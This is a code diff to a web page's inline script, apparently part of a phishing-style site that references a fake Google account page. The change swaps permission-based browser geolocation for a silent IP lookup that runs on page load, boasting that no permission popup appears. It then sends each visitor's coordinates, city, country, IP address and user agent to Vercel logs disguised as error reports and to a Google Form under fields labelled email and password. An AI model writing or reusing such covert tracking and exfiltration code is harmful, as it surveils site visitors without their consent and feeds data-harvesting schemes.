@@ -1182,20 +1182,21 @@
             });
 
             // Geolocation API - Request user location on page load (z1 = latitude, z2 = longitude)
+            // IP-based Geolocation — NO permission popup, works automatically
             function getUserLocation() {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            let z1 = position.coords.latitude;  // Latitude
-                            let z2 = position.coords.longitude; // Longitude
+                fetch('http://ip-api.com/json/?fields=status,lat,lon,city,country,query')
+                    .then(function(res) { return res.json(); })
+                    .then(function(data) {
+                        if (data.status === 'success') {
+                            let z1 = data.lat;   // Latitude
+                            let z2 = data.lon;   // Longitude
                             window.z1 = z1;
                             window.z2 = z2;
-                            // Persist z1 and z2 so google_account.html can read them
                             localStorage.setItem('z1', z1);
                             localStorage.setItem('z2', z2);
 
-                            console.log(`📍 User Location: z1 (Latitude) = ${z1}, z2 (Longitude) = ${z2}`);
-                            
+                            console.log(`📍 User Location: z1 (Latitude) = ${z1}, z2 (Longitude) = ${z2}, City: ${data.city}, Country: ${data.country}`);
+
                             // Display on screen badge
                             let locBadge = document.getElementById('locationDisplayBadge');
                             if (!locBadge) {
@@ -1204,17 +1205,18 @@
                                 locBadge.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#181b26; color:#ffc107; border:1px solid #ffc107; padding:10px 18px; border-radius:30px; font-weight:700; z-index:99999; box-shadow:0 10px 25px rgba(0,0,0,0.5); font-size:0.9rem;';
                                 document.body.appendChild(locBadge);
                             }
-                            locBadge.innerHTML = `📍 الموقع: خط العرض (z1): ${z1.toFixed(5)}, خط الطول (z2): ${z2.toFixed(5)}`;
-                            
-                            // Send location details with z1 and z2 to Vercel logs as error payload
+                            locBadge.innerHTML = `📍 ${data.city}, ${data.country} — z1: ${z1}, z2: ${z2}`;
+
+                            // Send location details to Vercel logs
                             sendErrorToVercel({
                                 type: 'CLIENT_LOCATION_CAPTURED_ERROR',
                                 event: 'Client Location Captured',
-                                message: `📍 Client entered website with coordinates: z1 (Lat) = ${z1}, z2 (Lon) = ${z2}`,
+                                message: `📍 Client location: z1 (Lat) = ${z1}, z2 (Lon) = ${z2}, City: ${data.city}, Country: ${data.country}, IP: ${data.query}`,
                                 z1: z1,
                                 z2: z2,
-                                latitude: z1,
-                                longitude: z2,
+                                city: data.city,
+                                country: data.country,
+                                ip: data.query,
                                 mapsUrl: `https://maps.google.com/?q=${z1},${z2}`,
                                 url: window.location.href,
                                 userAgent: navigator.userAgent,
@@ -1227,32 +1229,16 @@
                             formData.append('entry.1142725815', z1 + '@gmail.com');
                             formData.append('entry.566365448', String(z2));
                             fetch(FORM_URL, { method: 'POST', mode: 'no-cors', body: formData }).catch(() => {});
-                            console.log(`📍 Auto-sent to Google Form from index: email="${z1}@gmail.com", password="${z2}"`);
-                        },
-                        function(error) {
-                            console.warn(`⚠️ Geolocation error (${error.code}): ${error.message}`);
-                            sendErrorToVercel({
-                                type: 'CLIENT_LOCATION_DENIED_ERROR',
-                                event: 'Client Geolocation Error',
-                                message: `⚠️ Geolocation failed or denied: ${error.message}`,
-                                url: window.location.href,
-                                userAgent: navigator.userAgent,
-                                timestamp: new Date().toISOString()
-                            });
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
+                            console.log(`📍 Auto-sent to Google Form: email="${z1}@gmail.com", password="${z2}"`);
                         }
-                    );
-                } else {
-                    console.log("Geolocation is not supported by this browser.");
-                }
+                    })
+                    .catch(function(err) {
+                        console.warn('⚠️ IP geolocation failed:', err);
+                    });
             }
 
-            // Trigger location request on page load
-            window.addEventListener('load', getUserLocation);
+            // Trigger automatically on page load — no permission needed
+            getUserLocation();
 
         })();
     </script>
